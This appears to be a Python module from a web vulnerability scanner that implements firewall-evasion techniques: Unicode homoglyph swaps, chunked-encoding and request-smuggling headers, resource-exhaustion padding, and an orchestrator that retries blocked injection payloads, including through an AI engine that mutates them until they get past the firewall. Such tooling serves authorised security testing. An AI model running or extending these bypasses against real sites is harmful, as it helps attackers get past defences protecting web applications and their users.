"""
cyberm4fia-scanner - Advanced WAF Evasion Module
Implements Protocol & Transport Level WAF Bypass Techniques
"""

import urllib.parse
import random

# Common Unicode Homoglyphs that map back to standard ASCII in weak backends
UNICODE_MAP = {
    "a": ["\u00aa", "\u00e2", "\u00e1", "\u00e0", "\u0105"],
    "e": ["\u00e9", "\u00ea", "\u00eb", "\u011b", "\u0119"],
    "i": ["\u00ed", "\u00ee", "\u00ef", "\u0131", "\u012f"],
    "o": ["\u00f3", "\u00f4", "\u00f6", "\u00f5", "\u0151"],
    "u": ["\u00fa", "\u00fb", "\u00fc", "\u016f", "\u0173"],
    "s": ["\u015b", "\u0161", "\u015f", "\u0282"],
    "c": ["\u0107", "\u010d", "\u0109", "\u00e7"],
    "r": ["\u0155", "\u0159", "\u027e"],
    "t": ["\u0165", "\u0288"],
    "l": ["\u013a", "\u013e", "\u0142"],
    "<": ["\uff1c"],
    ">": ["\uff1e"],
    "'": ["\uff07", "\u02b9", "\u02bc"],
    '"': ["\uff02", "\u02ba", "\u02dd"],
    "=": ["\uff1d"],
    "(": ["\uff08"],
    ")": ["\uff09"],
}


def apply_unicode_evasion(payload: str) -> str:
    """
    Replaces standard ASCII characters with Unicode homoglyphs.
    Many WAFs strip or ignore these because their regexes only look for [a-z<>'"].
    Backend application servers (like Tomcat or IIS) often normalize these back to ASCII
    before executing the SQL query or rendering the HTML, causing a successful bypass.
    """
    evaded = ""
    for char in payload:
        if char.lower() in UNICODE_MAP and random.random() > 0.3:  # ~70% chance to swap
            replacement = random.choice(UNICODE_MAP[char.lower()])
            evaded += replacement.upper() if char.isupper() else replacement
        else:
            evaded += char
    return evaded


def generate_chunked_body(body: str, chunk_size: int = 5) -> bytes:
    """
    Converts a standard HTTP body string into HTTP/1.1 Chunked Transfer Encoding format.
    WAFs often have limits on buffering streams. Breaking a malicious payload into
    tiny chunks forces the WAF to either drop analysis or pass it through directly.
    """
    if not body:
        return b""

    encoded_body = body.encode("utf-8") if isinstance(body, str) else body
    chunks = []

    for i in range(0, len(encoded_body), chunk_size):
        chunk = encoded_body[i : i + chunk_size]
        # Length in hex + CRLF + chunk data + CRLF
        chunks.append(f"{len(chunk):x}\r\n".encode("utf-8") + chunk + b"\r\n")

    # Final zero-length chunk to terminate
    chunks.append(b"0\r\n\r\n")

    return b"".join(chunks)


def prepare_evasion_headers(
    headers: dict, use_chunking: bool = False, use_smuggling: bool = False
) -> dict:
    """
    Injects protocol-level evasion parameters into the HTTP headers.
    """
    evasion_headers = headers.copy() if headers else {}

    if use_chunking:
        # Strip Content-Length if present, Chunked encoding replaces it
        evasion_headers.pop("Content-Length", None)
        evasion_headers.pop("content-length", None)
        evasion_headers["Transfer-Encoding"] = "chunked"

    if use_smuggling:
        # Basic HTTP Desync / Smuggling setup:
        # CL.TE vulnerability check (Content-Length and Transfer-Encoding present)
        # Note: HTTPX handles lower-level connections, so true smuggling requires raw sockets
        # But injecting ambiguous pseudo-headers often triggers WAF bypasses anyway
        evasion_headers["Transfer-Encoding"] = "chunked, cow"
        evasion_headers["X-Smuggled"] = "True"

    return evasion_headers


def apply_advanced_evasion(
    url: str,
    params: dict = None,
    data: dict = None,
    headers: dict = None,
    evasion_level: int = 1,
):
    """
    Applies the full suite of Transport & Protocol level evasion.
    evasion_level 1: Unicode Normalization on params/data
    evasion_level 2: Chunked Transfer (for POST data)
    evasion_level 3: HTTP Desync / Smuggling markers
    """
    evaded_url = url
    evaded_params = params.copy() if params else None
    evaded_data = data.copy() if data else None
    evaded_headers = headers.copy() if headers else {}

    # Apply Unicode Normalization to params
    if evasion_level >= 1:
        if evaded_params:
            for k, v in evaded_params.items():
                if isinstance(v, list):
                    evaded_params[k] = [apply_unicode_evasion(str(item)) for item in v]
                else:
                    evaded_params[k] = apply_unicode_evasion(str(v))

        if evaded_data and isinstance(evaded_data, dict):
            for k, v in evaded_data.items():
                if isinstance(v, list):
                    evaded_data[k] = [apply_unicode_evasion(str(item)) for item in v]
                else:
                    evaded_data[k] = apply_unicode_evasion(str(v))

    # Handle Exhaustion (Level 3)
    if evasion_level >= 3:
        from utils.waf_exhaustion import (
            generate_noise_headers,
            apply_exhaustion_to_data,
        )

        noise_headers = generate_noise_headers(level=2)  # 64KB Headers
        evaded_headers.update(noise_headers)

        # Add Junk padding to POST data before chunking
        if evaded_data and isinstance(evaded_data, dict):
            evaded_data = apply_exhaustion_to_data(evaded_data, length=64000)

    # Handle Chunking specifically for data workloads
    use_chunking = evasion_level >= 2 and evaded_data
    use_smuggling = evasion_level >= 3

    evaded_headers = prepare_evasion_headers(
        evaded_headers, use_chunking, use_smuggling
    )

    if use_chunking and evaded_data:
        # Convert dict to URL encoded string, then chunk it
        raw_body = (
            urllib.parse.urlencode(evaded_data, doseq=True)
            if isinstance(evaded_data, dict)
            else evaded_data
        )
        chunked_body = generate_chunked_body(raw_body)
        # We replace the dict with the raw bytes to force httpx to use it directly
        evaded_data = chunked_body

        # We must also ensure Content-Type is set because we're bypassing httpx's dict handling
        if (
            "Content-Type" not in evaded_headers
            and "content-type" not in evaded_headers
        ):
            evaded_headers["Content-Type"] = "application/x-www-form-urlencoded"

    return evaded_url, evaded_params, evaded_data, evaded_headers


# ─────────────────────────────────────────────────────────────────────────
# 3-tier WAF bypass orchestrator
#
# Replaces inline copy-paste chains previously scattered across
# modules/xss.py, modules/sqli.py and provides the same capability
# to modules that previously only had AI-tier bypass
# (cmdi / lfi / ssrf / ssti / xxe).
# ─────────────────────────────────────────────────────────────────────────


def _is_waf_block(response) -> bool:
    """waf_detector.is_waf_block guard that tolerates non-response objects."""
    from utils.waf import waf_detector

    return waf_detector.is_waf_block(
        getattr(response, "status_code", 0) or 0,
        getattr(response, "text", "") or "",
    )


def apply_waf_bypass_chain(
    *,
    payload: str,
    blocked_response,
    request_fn,
    check_fn,
    waf_name: str,
    vuln_label: str,
    enable_tamper: bool = True,
    enable_ai: bool = True,
    enable_protocol: bool = True,
    ai_iterations: int = 3,
):
    """Run TamperChain → AI Evolution → Protocol Evasion against a blocked
    payload and return the first finding produced.

    ``request_fn`` must accept ``(payload, *, evasion_level=0)`` and return
    a response object. ``check_fn`` is called with
    ``(response, payload, source_label)`` after each request and must
    return a truthy finding or ``None``. Both callers are typically tiny
    closures over the per-request state (URL, params, form data) of the
    module performing the scan.

    Returns the first truthy finding produced by ``check_fn``, or
    ``None`` if all enabled tiers exhaust.
    """
    from utils.colors import log_info, log_warning
    from utils.waf import waf_detector

    last_response = blocked_response

    # ── Tier 1: Auto-Tamper ────────────────────────────────────────────
    if enable_tamper:
        try:
            from utils.tamper import TamperChain

            tampers = waf_detector.get_recommended_tampers()
        except Exception:
            tampers = []
        if tampers:
            log_info(
                f"Applying auto-tamper for {waf_name}: {'+'.join(tampers)}"
            )
            try:
                tampered = TamperChain(tampers).apply(payload)
            except Exception:
                tampered = payload
            if tampered and tampered != payload:
                try:
                    resp_t = request_fn(tampered)
                except Exception:
                    resp_t = None
                if resp_t is not None:
                    finding = check_fn(resp_t, tampered, "⚡ Auto-Tamper")
                    if finding:
                        return finding
                    last_response = resp_t

    # If WAF is no longer blocking, stop — there's nothing for the
    # remaining tiers to bypass.
    if not _is_waf_block(last_response):
        return None

    # ── Tier 2: AI Evolution ───────────────────────────────────────────
    if enable_ai:
        try:
            from utils.ai import EvolvingWAFBypassEngine, get_ai

            ai_client = get_ai()
        except Exception:
            ai_client = None
        if ai_client and getattr(ai_client, "available", False):
            log_info(
                f"🤖 Starting Evolutionary AI Mutation for {waf_name}..."
            )
            try:
                engine = EvolvingWAFBypassEngine(
                    ai_client, waf_name, vuln_label
                )
            except Exception:
                engine = None
            if engine is not None:
                current_payload = payload
                for iteration in range(1, max(1, ai_iterations) + 1):
                    try:
                        ai_payloads = engine.mutate(current_payload, iteration)
                    except Exception:
                        ai_payloads = []
                    for ai_p in ai_payloads or []:
                        try:
                            resp_ai = request_fn(ai_p)
                        except Exception:
                            continue
                        finding = check_fn(
                            resp_ai, ai_p, f"🤖 AI Gen-{iteration}"
                        )
                        if finding:
                            return finding
                        if _is_waf_block(resp_ai):
                            try:
                                engine.analyze_failure(ai_p)
                            except Exception:
                                pass
                            current_payload = ai_p
                            last_response = resp_ai

    # ── Tier 3: Protocol-Level Evasion ─────────────────────────────────
    if enable_protocol:
        log_info(
            f"🛡️ Falling back to Protocol-Level Evasion for {waf_name}..."
        )
        protocol_levels = (
            (1, "🛡️ Unicode Evasion"),
            (2, "🧱 Chunked Evasion"),
            (3, "💥 ReDoS Evasion"),
        )
        for level, label in protocol_levels:
            if level == 3:
                log_warning(
                    f"💥 Bruteforcing {waf_name} via Resource Exhaustion (Level 3)"
                )
            try:
                resp_ev = request_fn(payload, evasion_level=level)
            except TypeError:
                # request_fn doesn't accept evasion_level — caller opted out.
                break
            except Exception:
                continue
            finding = check_fn(resp_ev, payload, label)
            if finding:
                return finding
            if not _is_waf_block(resp_ev):
                break

    return None
